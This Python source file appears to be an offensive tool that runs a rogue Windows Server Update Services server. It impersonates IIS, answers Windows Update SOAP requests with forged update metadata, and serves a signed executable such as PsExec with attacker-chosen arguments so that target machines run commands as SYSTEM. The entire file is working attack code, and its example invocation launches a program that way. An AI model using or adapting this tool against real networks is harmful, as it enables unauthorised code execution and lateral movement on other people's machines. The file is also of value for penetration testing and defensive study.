#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from bs4 import BeautifulSoup
from random import randint
import uuid
import html
import datetime
import base64
import hashlib
import logging
import sys
import os
import argparse


class Update:
    def __init__(self, executable_file, executable_name, wuident_executable, client_address):
        self.get_config_xml = ''
        self.get_cookie_xml = ''
        self.sync_updates_xml = ''
        self.get_extended_update_info_xml = ''
        self.report_event_batch_xml = ''
        self.get_authorization_cookie_xml = ''

        self.revision_ids = [randint(900000, 999999), randint(900000, 999999)]
        self.deployment_ids = [randint(80000, 99999), randint(80000, 99999)]
        self.uuids = [uuid.uuid4(), uuid.uuid4()]

        self.executable = executable_file
        self.executable_name = executable_name
        self.sha1 = ''
        self.sha256 = ''

        self.wuident_executable = wuident_executable

        self.client_address = client_address

    def get_last_change(self):
        return (datetime.datetime.now() - datetime.timedelta(days=3)).isoformat()

    def get_cookie(self):
        return base64.b64encode(b'A'*47).decode('utf-8')

    def get_expire(self):
        return (datetime.datetime.now() + datetime.timedelta(days=1)).isoformat()

    def set_resources_xml(self, base_path, command):
        # init resources
        try:
            with open('{}/resources/get-config.xml'.format(base_path), 'r') as file:
                self.get_config_xml = file.read().format(lastChange=self.get_last_change())
                file.close()

            with open('{}/resources/get-cookie.xml'.format(base_path), 'r') as file:
                self.get_cookie_xml = file.read().format(expire=self.get_expire(), cookie=self.get_cookie())
                file.close()

            with open('{}/resources/sync-updates.xml'.format(base_path), 'r') as file:
                # TODO KB1234567 -> dynamic
                self.sync_updates_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1],
                                                           deployment_id1=self.deployment_ids[0], deployment_id2=self.deployment_ids[1],
                                                           uuid1=self.uuids[0], uuid2=self.uuids[1], expire=self.get_expire(), cookie=self.get_cookie())
                file.close()

            with open('{}/resources/get-extended-update-info.xml'.format(base_path), 'r') as file:
                self.get_extended_update_info_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1], sha1=self.sha1, sha256=self.sha256,
                                                                       filename=self.executable_name, file_size=len(executable_file), command=html.escape(html.escape(command)),
                                                                       url='http://{host}/{path}/{executable}'.format(host=self.client_address, path=uuid.uuid4(), executable=self.executable_name))
                file.close()

            with open('{}/resources/report-event-batch.xml'.format(base_path), 'r') as file:
                self.report_event_batch_xml = file.read()
                file.close()

            with open('{}/resources/get-authorization-cookie.xml'.format(base_path), 'r') as file:
                self.get_authorization_cookie_xml = file.read().format(cookie=self.get_cookie())
                file.close()

        except Exception as err:
            logging.error('Error: {err}'.format(err=err))
            sys.exit(1)

    def set_filedigest(self):
        hash1 = hashlib.sha1()
        hash256 = hashlib.sha256()
        try:
            data = self.executable
            hash1.update(data)
            hash256.update(data)
            self.sha1 = base64.b64encode(hash1.digest()).decode()
            self.sha256 = base64.b64encode(hash256.digest()).decode()

        except Exception as err:
            logging.error('Error in set_filedigest: {err}'.format(err=err))
            sys.exit(1)

    def __str__(self):
        return 'The update metadata - uuids: {uuids},revision_ids: {revision_ids}, deployment_ids: {deployment_ids}, executable: {executable}, sha1: {sha1}, sha256: {sha256}'.format(
            uuids=self.uuids, revision_ids=self.revision_ids, deployment_ids=self.deployment_ids, executable=self.executable_name, sha1=self.sha1, sha256=self.sha256)


class S(BaseHTTPRequestHandler):
    def _set_response(self, serveEXE=False):

        self.send_response(200)
        self.server_version = 'Microsoft-IIS/10.0'
        # self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Cache-Control', 'private')

        if serveEXE:
            self.send_header('Content-Type', 'application/octet-stream')
        else:
            self.send_header('Content-type', 'text/xml; chartset=utf-8')

        self.send_header('X-AspNet-Version', '4.0.30319')
        self.send_header('X-Powered-By', 'ASP.NET')
        self.end_headers()

    def do_GET(self):
        logging.debug('GET request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))

        if self.path.find("selfupdate/wuident.cab"):
            logging.info("Target is not Windows 10. wuident.cab file requested.")
            if update_handler.wuident_executable:
                self._set_response(True)
                self.wfile.write(update_handler.wuident_executable)
            else:
                logging.info("wuident.cab file was not found. Please provide it using the -w argument.")
        elif self.path.find(".exe"):
            logging.info("Requested: {path}".format(path=self.path))

            self._set_response(True)
            self.wfile.write(update_handler.executable)

    def do_POST(self):

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        post_data_xml = BeautifulSoup(post_data, "xml")

        logging.debug("POST Request,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=post_data_xml.encode_contents()))

        soap_action = self.headers['SOAPAction']

        if soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b76899b4-ad55-427d-a748-2ecf0829412b

            logging.info('SOAP Action: {}'.format(soap_action))

            data = BeautifulSoup(update_handler.get_config_xml, 'xml')

            self._set_response()
            self.wfile.write(data.encode_contents())

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/36a5d99a-a3ca-439d-bcc5-7325ff6b91e2

            logging.info('SOAP Action: {}'.format(soap_action))

            data = BeautifulSoup(update_handler.get_cookie_xml, "xml")

            self._set_response()
            self.wfile.write(data.encode_contents())

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/6b654980-ae63-4b0d-9fae-2abb516af894

            logging.info('SOAP Action: {}'.format(soap_action))

            data = BeautifulSoup(update_handler.sync_updates_xml, "xml")

            self._set_response()
            self.wfile.write(data.encode_contents())

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/862adc30-a9be-4ef7-954c-13934d8c1c77

            logging.info('SOAP Action: {}'.format(soap_action))

            data = BeautifulSoup(update_handler.get_extended_update_info_xml, "xml")

            self._set_response()
            self.wfile.write(data.encode_contents())

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/da9f0561-1e57-4886-ad05-57696ec26a78

            logging.info(soap_action)

            data = BeautifulSoup(update_handler.report_event_batch_xml, "xml")

            self._set_response()
            self.wfile.write(data.encode_contents())

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/44767c55-1e41-4589-aa01-b306e0134744

            logging.info('SOAP Action: {}'.format(soap_action))

            data = BeautifulSoup(update_handler.get_authorization_cookie_xml, "xml")

            self._set_response()
            self.wfile.write(data.encode_contents())

        else:
            logging.warining("SOAP Action not defined")

        if data:
            logging.debug("POST Response,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=data.encode_contents))
        else:
            logging.warning("POST Response without data.")


def run(host, port, server_class=HTTPServer, handler_class=S):
    server_address = (host, port)
    httpd = server_class(server_address, handler_class)

    logging.info('Starting httpd...\n')

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

    httpd.server_close()
    logging.info('Stopping httpd...\n')


def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython pywsus.py -H X.X.X.X -p 8530 -e PsExec64.exe -c "-accepteula -s calc.exe"')

    parser._optionals.title = "OPTIONS"
    parser.add_argument('-H', '--host', required=True, help='The listening adress.')
    parser.add_argument('-p', '--port', type=int, default=8530, help='The listening port.')
    parser.add_argument('-e', '--executable', type=argparse.FileType('rb'), required=True, help='The Microsoft signed executable returned to the client.')
    parser.add_argument('-c', '--command', required=True, help='The parameters for the current executable.')
    parser.add_argument('-w', '--wuident-file', type=argparse.FileType('rb'), required=False, help='The path to the wuident.cab file (required for targets older than Windows 10).')
    parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Increase output verbosity.')

    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    executable_file = args.executable.read()
    executable_name = os.path.basename(args.executable.name)
    args.executable.close()

    base_path = os.path.abspath(os.path.dirname(__file__))

    wuident_executable = None
    if args.wuident_file:
        wuident_executable = args.wuident_file.read()

    update_handler = Update(executable_file, executable_name, wuident_executable, client_address='{host}:{port}'.format(host=args.host, port=args.port))

    update_handler.set_filedigest()
    update_handler.set_resources_xml(base_path, args.command)

    logging.info(update_handler)

    run(host=args.host, port=args.port)
